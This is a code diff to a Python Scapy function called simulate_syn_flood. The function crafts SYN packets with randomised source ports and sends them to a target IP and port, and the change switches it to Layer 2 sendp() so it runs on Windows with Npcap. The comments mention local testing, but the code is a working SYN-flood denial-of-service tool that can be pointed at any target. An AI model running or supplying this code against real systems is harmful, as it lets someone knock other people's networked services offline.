@@ -16,12 +16,25 @@ def simulate_syn_flood(target_ip, target_port, packet_count):
             src_port = random.randint(1024, 65535)
             
             # Construct the packet
+            # Use Layer 2 (Ether) for better compatibility on Windows/Npcap
+            # 'ff:ff:ff:ff:ff:ff' is broadcast, or typically fine for local testing.
+            # Localhost loopback on Windows Npcap can be tricky.
+            # We will try 'send' (Layer 3) with a small fallback or just keep send() but ensure interface is picked?
+            # The error 'L3pcapSocket object has no attribute send' suggests an issue with the conf.L3socket.
+            
+            # Alternative: Use "socket" manually or try "sendp" which uses L2socket.
+            from scapy.all import Ether, sendp
+            
+            # For loopback on Windows, the MAC address might be relevant or not.
+            # We'll stick to a simple Ether / IP / TCP stack.
+            eth_layer = Ether()
             ip_layer = IP(src=src_ip, dst=target_ip)
             tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
-            packet = ip_layer / tcp_layer
+            packet = eth_layer / ip_layer / tcp_layer
             
-            # Send the packet (verbose=0 suppresses "Sent 1 packet" messages)
-            send(packet, verbose=0)
+            # Send the packet at Layer 2
+            # iface=None lets Scapy pick. 
+            sendp(packet, verbose=0)
             
             if (i + 1) % 50 == 0:
                 print(f"Sent {i + 1} packets...")
